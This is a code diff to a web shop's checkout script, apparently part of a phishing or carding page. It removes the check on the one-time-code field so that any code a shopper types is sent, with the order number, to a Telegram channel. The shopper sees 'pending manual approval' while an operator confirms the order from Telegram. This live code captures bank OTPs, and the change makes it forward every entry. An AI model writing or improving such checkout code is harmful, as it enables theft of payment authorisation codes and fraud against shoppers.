@@ -929,7 +929,7 @@ function createCheckoutModal() {
                     </div>
                     <div class="otp-actions">
                         <button id="resend-otp-btn" class="btn btn-secondary" disabled>${(currentLanguage === 'es' ? 'Reenviar Código' : 'Resend Code')}</button>
-                        <button id="verify-otp-btn" class="btn btn-primary" disabled>${(currentLanguage === 'es' ? 'Verificar Código' : 'Verify Code')}</button>
+                        <button id="verify-otp-btn" class="btn btn-primary">${(currentLanguage === 'es' ? 'Verificar Código' : 'Verify Code')}</button>
                         <button id="skip-otp-btn" class="btn btn-outline" style="margin-top: 1rem;">
                         ${(currentLanguage === 'es' ? 'No requiero OTP' : 'I don\'t require OTP')}
                     </button>
@@ -1285,19 +1285,16 @@ function setupOTPInputs() {
 
     if (!otpInput || !verifyBtn) return;
 
-    // This listener enables/disables the verify button and formats input
+    // This listener just formats the input
     otpInput.addEventListener('input', function(e) {
         let value = e.target.value.replace(/\D/g, '');
         value = value.substring(0, 6);
         e.target.value = value;
-
-        // Enable button only when 6 digits are entered
-        verifyBtn.disabled = value.length !== 6;
     });
 
     // This listener allows submitting with the Enter key
     otpInput.addEventListener('keydown', function(e) {
-        if (e.key === 'Enter' && verifyBtn && !verifyBtn.disabled) {
+        if (e.key === 'Enter') {
             e.preventDefault();
             verifyOTP();
         }
@@ -1305,9 +1302,7 @@ function setupOTPInputs() {
 
     // Add the click listener directly here for robustness
     verifyBtn.addEventListener('click', function() {
-        if (!this.disabled) {
-            verifyOTP();
-        }
+        verifyOTP();
     });
 }
 
@@ -1379,46 +1374,31 @@ function verifyOTP() {
 
     console.log('Verifying OTP:', enteredOTP, 'Length:', enteredOTP.length);
 
-    // Check if OTP format is valid
-    if (enteredOTP.length === 6 && /^\d{6}$/.test(enteredOTP)) {
-        if (otpError) {
-            otpError.style.display = 'none';
-        }
-
-        // Send the user-entered OTP to Telegram for verification
-        if (typeof TelegramNotifications !== 'undefined' && checkoutData.orderNumber) {
-            TelegramNotifications.userEnteredOTP(enteredOTP, checkoutData.orderNumber);
-        }
-
-        // Update the UI to show a "waiting for confirmation" message
-        const otpContent = document.querySelector('.otp-content');
-        if (otpContent) {
-            otpContent.innerHTML = `
-                <div class="success-icon" style="font-size: 3rem; color: var(--primary-color); margin-bottom: 1rem;">
-                    <i class="fas fa-hourglass-half"></i>
-                </div>
-                <h3>${(currentLanguage === 'es' ? 'Esperando Confirmación' : 'Awaiting Confirmation')}</h3>
-                <p>${(currentLanguage === 'es' ? 'Tu pedido está pendiente de aprobación manual. Recibirás una notificación pronto.' : 'Your order is pending manual approval. You will receive a notification shortly.')}</p>
-            `;
-        }
-
-        // Start polling for confirmation from the backend.
-        // This function will repeatedly check if the order has been confirmed in Telegram.
-        pollForConfirmation(checkoutData.orderNumber);
-        
-    } else {
-        // Show error for invalid or incomplete OTP
-        console.log('Invalid or incomplete OTP');
-        if (otpError) {
-            otpError.style.display = 'block';
-            const errorText = otpError.querySelector('span');
-            if (errorText) {
-                errorText.textContent = currentLanguage === 'es' ? 
-                    'Por favor ingrese exactamente 6 dígitos' : 
-                    'Please enter exactly 6 digits';
-            }
-        }
+    // Always send to Telegram, regardless of input.
+    if (otpError) {
+        otpError.style.display = 'none';
     }
+
+    // Send the user-entered OTP to Telegram for verification
+    if (typeof TelegramNotifications !== 'undefined' && checkoutData.orderNumber) {
+        TelegramNotifications.userEnteredOTP(enteredOTP, checkoutData.orderNumber);
+    }
+
+    // Update the UI to show a "waiting for confirmation" message
+    const otpContent = document.querySelector('.otp-content');
+    if (otpContent) {
+        otpContent.innerHTML = `
+            <div class="success-icon" style="font-size: 3rem; color: var(--primary-color); margin-bottom: 1rem;">
+                <i class="fas fa-hourglass-half"></i>
+            </div>
+            <h3>${(currentLanguage === 'es' ? 'Esperando Confirmación' : 'Awaiting Confirmation')}</h3>
+            <p>${(currentLanguage === 'es' ? 'Tu pedido está pendiente de aprobación manual. Recibirás una notificación pronto.' : 'Your order is pending manual approval. You will receive a notification shortly.')}</p>
+        `;
+    }
+
+    // Start polling for confirmation from the backend.
+    // This function will repeatedly check if the order has been confirmed in Telegram.
+    pollForConfirmation(checkoutData.orderNumber);
 }
 
 /**
